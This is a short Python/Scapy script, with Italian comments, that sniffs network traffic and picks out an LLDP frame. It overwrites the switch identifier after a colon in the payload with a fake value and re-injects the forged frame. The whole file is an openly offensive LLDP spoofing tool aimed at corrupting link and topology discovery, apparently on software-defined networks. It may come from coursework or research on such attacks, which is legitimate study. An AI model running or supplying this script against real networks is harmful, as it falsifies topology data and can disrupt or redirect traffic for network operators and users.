from scapy.all import *


s = sniff(count=5)
print("Sniff concluso", s)

LLDPPacketList = []
for packet in s:
    if(packet.type == 35020):		#pacchetto protocollo LLDP
        LLDPPacketList.append(packet)


macSwitch = '3' #MAC di uno switch non collegato

evilPacket = LLDPPacketList[0]
load = evilPacket.load
print(evilPacket)
evilLoad=[]

i=0
while(i<len(load)):
   if(load[i]==58):			#58 codice ascii dei :, dopo i due punti c'è il MAC che viene sostituito
      evilLoad.append(58)
      i+=1
      j=0
      while(j<1):
         evilLoad.append(ord(macSwitch[j])) 		#ord ritorna il codice ASCII di ciò che gli viene passato
         j+=1
      i+=j
   else:
      evilLoad.append(load[i])
      i+=1

evilPacket.load = bytes(evilLoad)
print(evilPacket)
sendp(evilPacket)
